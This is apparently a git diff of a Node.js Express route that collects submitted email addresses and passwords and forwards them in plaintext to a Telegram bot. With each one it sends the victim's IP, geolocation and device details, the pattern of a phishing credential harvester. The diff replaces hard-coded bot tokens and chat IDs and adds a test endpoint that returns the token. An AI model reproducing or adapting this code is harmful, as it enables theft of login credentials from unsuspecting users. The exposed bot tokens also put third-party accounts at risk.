@@ -2,31 +2,19 @@ const express = require("express");
 const fetch = require("node-fetch");
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
-const cors = require('cors');
 
 const router = express.Router();
 
-// Your Telegram bot credentials
-const BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
-const CHAT_ID = "6068638071";
+// ✅ USE THESE CREDENTIALS (the ones you confirmed)
+const BOT_TOKEN = "5805445041:AAEyEOk6JELDr7SLFORniePoZsusK9peChs";
+const CHAT_ID = "1527776859";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-// Enable CORS
-router.use(cors());
-
-// Handle OPTIONS preflight requests
-router.options('*', cors());
 
 router.post('/', async (req, res) => {
     try {
-        // Set CORS headers
-        res.header('Access-Control-Allow-Origin', '*');
-        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-        
-        console.log('📨 Received request body:', req.body);
+        console.log('📨 Received login request:', req.body);
 
-        const { email, password, rememberMe, userAgent, language, platform, screenResolution, timezone, timestamp } = req.body;
+        const { email, password } = req.body;
 
         if (!email || !password) {
             return res.status(400).json({ 
@@ -39,8 +27,7 @@ router.post('/', async (req, res) => {
         const location = geoip.lookup(ip);
         const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';
 
-        // Use frontend userAgent or parse from headers
-        const parser = new UAParser(userAgent || req.headers['user-agent']);
+        const parser = new UAParser(req.headers['user-agent']);
         const agent = parser.getResult();
         const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;
 
@@ -51,15 +38,11 @@ router.post('/', async (req, res) => {
 - Password: ${password}
 - IP: ${ip}
 - Location: ${locationStr}
-- Timestamp: ${timestamp || new Date().toISOString()}
+- Timestamp: ${new Date().toISOString()}
 - Device: ${deviceType}
-- Screen: ${screenResolution || 'Unknown'}
-- Timezone: ${timezone || 'Unknown'}
-- Language: ${language || 'Unknown'}
-- Platform: ${platform || 'Unknown'}
         `;
 
-        console.log('📤 Sending to Telegram:', message);
+        console.log('📤 Sending to Telegram...');
 
         // Send to Telegram
         const telegramResponse = await fetch(TELEGRAM_API, {
@@ -72,9 +55,11 @@ router.post('/', async (req, res) => {
             })
         });
 
+        const telegramResult = await telegramResponse.json();
+        
         if (!telegramResponse.ok) {
-            const errText = await telegramResponse.text();
-            throw new Error(`Telegram API error: ${errText}`);
+            console.error('❌ Telegram API error:', telegramResult);
+            throw new Error(`Telegram API error: ${JSON.stringify(telegramResult)}`);
         }
 
         console.log(`✅ Telegram notification sent for ${email}`);
@@ -86,18 +71,36 @@ router.post('/', async (req, res) => {
             loginDetails: { 
                 device: deviceType, 
                 ip, 
-                location: locationStr,
-                timestamp: new Date().toISOString()
+                location: locationStr
             }
         });
 
     } catch (error) {
-        console.error("❌ Error sending Telegram message:", error);
+        console.error("❌ Error:", error);
         res.status(500).json({ 
             success: false, 
-            message: "Failed to send Telegram notification", 
+            message: "Failed to send notification", 
             error: error.message 
         });
+    }
+});
+
+// Test endpoint to verify bot is working
+router.get('/test', async (req, res) => {
+    try {
+        const botTest = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+        const botInfo = await botTest.json();
+        
+        res.json({
+            message: "Backend route is working!",
+            botInfo: botInfo,
+            credentials: {
+                botToken: BOT_TOKEN,
+                chatId: CHAT_ID
+            }
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
     }
 });
 
